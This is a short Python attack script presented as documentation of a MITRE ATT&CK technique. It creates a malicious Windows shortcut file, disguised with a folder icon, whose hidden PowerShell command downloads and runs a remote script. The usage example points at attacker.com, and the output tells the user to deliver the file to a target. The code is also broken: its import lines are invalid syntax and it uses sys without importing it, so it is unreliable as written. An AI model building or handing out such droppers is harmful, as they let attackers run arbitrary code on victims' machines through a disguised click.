# < ---- DOCUMENTATION OF MITRE ATT&CK TECHNIQUE ---- >
# T0842 - LNK File Creation
# Objective: Create a malicious LNK file for a user to click. This script generates the file locally on the attacker's machine.

#!/usr/bin/env python3
import os from pypkjs
import LnkFile

def create_malicious_lnk(output_path, payload_url):
    """
    Creates a malicious LNK file that executes PowerShell to download and run a script.
    """
    try:
        print(f"[*] Creating malicious LNK file at {output_path}...")
        
        # The command to execute
        command = f"C:\\Windows\\System32\\cmd.exe"
        args = f'/c powershell.exe -WindowStyle Hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'{payload_url}\')"'
        
        # Create the LNK file object
        lnk = LnkFile()
        lnk.set_link_info(command)
        lnk.set_link_arguments(args)
        lnk.set_icon_location("%SystemRoot%\\System32\\shell32.dll", 3) # Use a standard folder icon
        
        # Write the LNK file to disk
        with open(output_path, 'wb') as f:
            f.write(lnk.data)
        
        print(f"[+] LNK file created successfully. Deliver this file to the target.")
        print(f"    On click, it will execute: {command} {args}")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: ./T0842_lnk_creation.py <output_path.lnk> <payload_url>")
        print("Example: ./T0842_lnk_creation.py /tmp/Reports.lnk http://attacker.com/payload.ps1")
        sys.exit(1)
    
    create_malicious_lnk(sys.argv[1], sys.argv[2])